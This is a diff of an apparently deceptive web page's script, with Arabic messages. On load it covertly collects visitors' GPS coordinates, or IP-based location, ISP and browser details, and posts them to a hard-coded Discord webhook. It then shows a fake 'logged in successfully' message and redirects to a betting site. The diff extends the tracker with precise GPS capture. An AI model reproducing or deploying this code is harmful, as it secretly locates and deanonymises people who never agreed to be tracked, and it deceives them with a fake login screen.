@@ -3,31 +3,38 @@
   const userAgent = navigator.userAgent;
   const webhookUrl = "https://discord.com/api/webhooks/1363558899382358067/O06A811WKbK7gvFMQQWTXkzdIHwe9qTBl0GQyibpDxj1yBxtxIPm2PZpExJXxeKdbNTQ";
 
-  Promise.all([
-    fetch("https://ipinfo.io/json?token=34011ec27e4e2f").then(res => res.json()),
-    fetch("https://ipwho.is/").then(res => res.json()),
-    fetch("http://ip-api.com/json/").then(res => res.json()),
-    fetch("https://ipapi.co/json/").then(res => res.json())
-  ])
-  .then(([info1, info2, info3, info4]) => {
-    const countries = [info1.country, info2.country, info3.country, info4.country_name];
-    const cities = [info1.city, info2.city, info3.city, info4.city];
+  function sendMessage(content) {
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content })
+    });
+  }
 
-    // دالة تحسب أكثر قيمة مكررة
-    const getMostCommon = (arr) => {
-      const count = {};
-      arr.forEach(val => {
-        if (!val) return;
-        count[val] = (count[val] || 0) + 1;
-      });
-      return Object.keys(count).reduce((a, b) => count[a] > count[b] ? a : b, "");
-    };
+  function getMostCommon(arr) {
+    const count = {};
+    arr.forEach(val => {
+      if (!val) return;
+      count[val] = (count[val] || 0) + 1;
+    });
+    return Object.keys(count).reduce((a, b) => count[a] > count[b] ? a : b, "");
+  }
 
-    const bestCountry = getMostCommon(countries);
-    const bestCity = getMostCommon(cities);
+  function fallbackToIPAPIs() {
+    Promise.all([
+      fetch("https://ipinfo.io/json?token=34011ec27e4e2f").then(res => res.json()),
+      fetch("https://ipwho.is/").then(res => res.json()),
+      fetch("http://ip-api.com/json/").then(res => res.json()),
+      fetch("https://ipapi.co/json/").then(res => res.json())
+    ])
+    .then(([info1, info2, info3, info4]) => {
+      const countries = [info1.country, info2.country, info3.country, info4.country_name];
+      const cities = [info1.city, info2.city, info3.city, info4.city];
 
-    const message = {
-      content: `🕵️‍♂️ زائر جديد دخل الموقع:\n
+      const bestCountry = getMostCommon(countries);
+      const bestCity = getMostCommon(cities);
+
+      const content = `🕵️‍♂️ زائر جديد دخل الموقع (بدون GPS):\n
 🌍 الموقع المحسن:
   الدولة: ${bestCountry}
   المدينة: ${bestCity}
@@ -44,31 +51,51 @@
   - ip-api.com: ${info3.isp}
   - ipapi.co: ${info4.org}
 
-⏰ المنطقة الزمنية:
-  - ipinfo.io: ${info1.timezone}
-  - ipwho.is: ${info2.timezone?.id}
-  - ip-api.com: ${info3.timezone}
-  - ipapi.co: ${info4.timezone}
+🖥️ المتصفح: ${userAgent}
+📅 الوقت: ${now}`;
+
+      sendMessage(content);
+    });
+  }
+
+  function handleGPSLocation() {
+    if (!navigator.geolocation) {
+      fallbackToIPAPIs();
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
+        const content = `🛰️ تم تحديد الموقع بدقة عبر GPS:\n
+📍 الإحداثيات:
+  Latitude: ${lat}
+  Longitude: ${lon}
+📌 [عرض على خرائط جوجل](${gmaps})
 
 🖥️ المتصفح: ${userAgent}
-📅 الوقت: ${now}`
-    };
+📅 الوقت: ${now}`;
 
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(message)
-    });
+        sendMessage(content);
+      },
+      (error) => {
+        console.warn("GPS مرفوض أو غير متاح، استخدام IP بديل");
+        fallbackToIPAPIs();
+      },
+      { timeout: 5000 }
+    );
+  }
 
+  // ابدأ التنفيذ
+  handleGPSLocation();
+
+  // بعد ما يخلص، الرسالة والريدايركت
+  setTimeout(() => {
+    document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
     setTimeout(() => {
-      document.querySelector('.card').innerHTML = "<h3>تم تسجيل الدخول بنجاح ✅</h3><p>جاري تحويلك الآن...</p>";
-      setTimeout(() => {
-        window.location.href = "https://1xbet.com";
-      }, 3000);
-    }, 2000);
-  })
-  .catch(err => {
-    document.querySelector('.card').innerHTML = '<p>⚠️ حصل خطأ في تحميل البيانات.</p>';
-    console.error(err);
-  });
+      window.location.href = "https://1xbet.com";
+    }, 3000);
+  }, 3000);
 </script>
